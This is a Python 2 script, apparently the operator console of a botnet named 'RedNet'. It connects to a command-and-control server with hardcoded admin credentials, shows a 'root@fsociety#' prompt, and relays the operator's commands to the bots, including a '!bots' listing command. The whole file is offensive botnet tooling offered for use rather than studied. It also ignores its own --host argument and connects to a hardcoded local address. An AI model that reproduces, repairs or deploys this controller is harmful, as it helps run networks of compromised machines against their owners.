import socket,argparse
from sys import exit

IP              = '127.0.0.1'
PORT            = 4444
BUFFER_SIZE     = 1024

user     = 'admin'
password = 'admin'

root_socket     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
root_socket.connect((IP,PORT))
root_socket.send('admin')

def starting():
    print """
8 888888888o.   8 8888888888   8 888888888o.      b.             8 8 8888888888 8888888 8888888888 
8 8888    `88.  8 8888         8 8888    `^888.   888o.          8 8 8888             8 8888       
8 8888     `88  8 8888         8 8888        `88. Y88888o.       8 8 8888             8 8888       
8 8888     ,88  8 8888         8 8888         `88 .`Y888888o.    8 8 8888             8 8888       
8 8888.   ,88'  8 888888888888 8 8888          88 8o. `Y888888o. 8 8 888888888888     8 8888       
8 888888888P'   8 8888         8 8888          88 8`Y8o. `Y88888o8 8 8888             8 8888       
8 8888`8b       8 8888         8 8888         ,88 8   `Y8o. `Y8888 8 8888             8 8888       
8 8888 `8b.     8 8888         8 8888        ,88' 8      `Y8o. `Y8 8 8888             8 8888       
8 8888   `8b.   8 8888         8 8888    ,o88P'   8         `Y8o.` 8 8888             8 8888       
8 8888     `88. 8 888888888888 8 888888888P'      8            `Yo 8 888888888888     8 8888      

Coded by: Reddy
Github: https://github.com/playerred54321\n
"""

def captureCommand():
    while True:
        try:
            command = raw_input('root@fsociety# ')
            if not command:
                continue   
            elif '!exit' in command:
                raise SyntaxError
            elif '!bots' in command:
                sendCommands(addCredentials(command))
                print root_socket.recv(BUFFER_SIZE)
            else: 
                sendCommands(addCredentials(command))
        except SyntaxError:
            exit(0)
        except Exception:
            continue

def addCredentials(command):
    command  = user+'-'+password+':'+command
    return command

def sendCommands(command):
    root_socket.send(command)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='RedNet - Botnet developed by Reddy')
    parser.add_argument('--host', type=str, help='IP of server')
    parser.add_argument('--port','-p', type=int, help='PORT of server', default=4444)
    args = parser.parse_args()
    if not args.host:
        parser.print_help()
        exit(0)
    starting()
    captureCommand()

        
            

